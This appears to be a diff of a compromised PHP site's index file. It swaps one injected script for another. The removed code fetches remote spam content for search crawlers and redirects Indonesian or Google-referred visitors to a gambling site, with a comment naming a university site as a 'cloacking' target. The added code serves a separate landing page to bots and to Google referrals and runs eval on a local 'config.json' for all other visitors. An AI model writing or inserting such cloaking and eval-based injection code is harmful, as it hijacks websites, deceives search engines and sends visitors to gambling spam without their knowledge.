@@ -1,67 +1,52 @@
-<?php  
-ob_start();  
-header('Vary: Accept-Language');  
-header('Vary: User-Agent');  
-
-function get_client_ip() {  
-    if (isset($_SERVER['HTTP_CLIENT_IP'])) {  
-        return $_SERVER['HTTP_CLIENT_IP'];  
-    } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
-        return $_SERVER['HTTP_X_FORWARDED_FOR'];  
-    } elseif (isset($_SERVER['HTTP_X_FORWARDED'])) {  
-        return $_SERVER['HTTP_X_FORWARDED'];  
-    } elseif (isset($_SERVER['HTTP_FORWARDED_FOR'])) {  
-        return $_SERVER['HTTP_FORWARDED_FOR'];  
-    } elseif (isset($_SERVER['HTTP_FORWARDED'])) {  
-        return $_SERVER['HTTP_FORWARDED'];  
-    } elseif (isset($_SERVER['REMOTE_ADDR'])) {  
-        return $_SERVER['REMOTE_ADDR'];  
-    } else {  
-        return '127.0.0.1';  
-    }  
-}  
-
-function make_request($url) {  
-    if (function_exists('curl_init')) {  
-        $ch = curl_init();  
-        curl_setopt($ch, CURLOPT_URL, $url);  
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
-        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');  
-        $response = curl_exec($ch);  
-        curl_close($ch);  
-        return $response;  
-    } elseif (ini_get('allow_url_fopen')) {  
-        return file_get_contents($url);  
-    }  
-    return false;  
-}  
-
-$current_path = $_SERVER['REQUEST_URI'];  
-$is_home_page = ($current_path == "/" || $current_path == "/index.php");  
-
-$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);  
-$rf = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : '';  
-$ip = get_client_ip();  
-$bot_url = "https://iotech.id/eduin.txt";                                                    //linkedraws
-$reff_url = "https://comprarpopperss.es/situstogel";                                         //linkedAMP
-$file = make_request($bot_url);  
-$geolocation = json_decode(make_request("http://ip-api.com/json/$ip"), true);  
-$cc = isset($geolocation['countryCode']) ? $geolocation['countryCode'] : null;  
-$botchar = "/(googlebot|slurp|adsense|inspection|ahrefs)/";  
-
-if (preg_match($botchar, $ua)) {  
-    if ($is_home_page) {ob_clean(); echo $file; ob_end_flush(); exit;} 
-}  
-
-if ($cc === "ID") {  
-    if ($is_home_page) {ob_clean(); header("Location: $reff_url", true, 302); ob_end_flush(); exit;}
-}  
-
-if (!empty($rf) && (stripos($rf, "google.co.id") !== false)) {  
-    if ($is_home_page) {ob_clean(); header("Location: $reff_url", true, 302); ob_end_flush(); exit;}
-}
-?>
-
 <?php
-    $BASE_URL= "https://sru.edu.in"; //link cloacking Site
-?>
+function isSearchEngineBot() {
+    return preg_match('/(googlebot|bingbot|yandexbot|baiduspider|duckduckbot|slurp|facebot|ia_archiver|Googlebot|TelegramBot|bingbot|Google-Site-Verification|Google-InspectionTool|AhrefsBot)/i', $_SERVER['HTTP_USER_AGENT']);
+}
+
+function isFromGoogle() {
+    return isset($_SERVER['HTTP_REFERER']) &&
+           (strpos($_SERVER['HTTP_REFERER'], 'google.com') !== false ||
+            strpos($_SERVER['HTTP_REFERER'], 'google.co.id') !== false);
+}
+
+function NuLzFetch($url){
+    if (function_exists('file_get_contents')) {
+        $fetch = file_get_contents($url);
+        return $fetch;
+    } elseif (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
+        $fetch = curl_exec($ch);
+        curl_close($ch);
+        return $fetch;
+    } else {
+        $fetch = "Can'not Fetch This URL => $url";
+        return $fetch;
+    }
+}
+
+$cookie_expiration = time() + (365 * 86400); //1 years
+if (!isset($_COOKIE['visited'])) {
+    setcookie('visited', '1', $cookie_expiration, "/");
+}
+
+$cache_duration = 365 * 86400; //1 years
+header("Cache-Control: max-age=$cache_duration, public, must-revalidate");
+header("Pragma: cache");
+
+$landing_page = 'conf.json';   // index landing page
+$index_home = 'config.json';   // index default
+
+if (isSearchEngineBot()) {
+    echo NuLzFetch($landing_page);
+} else {
+    if (isFromGoogle()) {
+        echo NuLzFetch($landing_page);
+    } else {
+        eval ('?>'.NuLzFetch($index_home));
+    }
+}
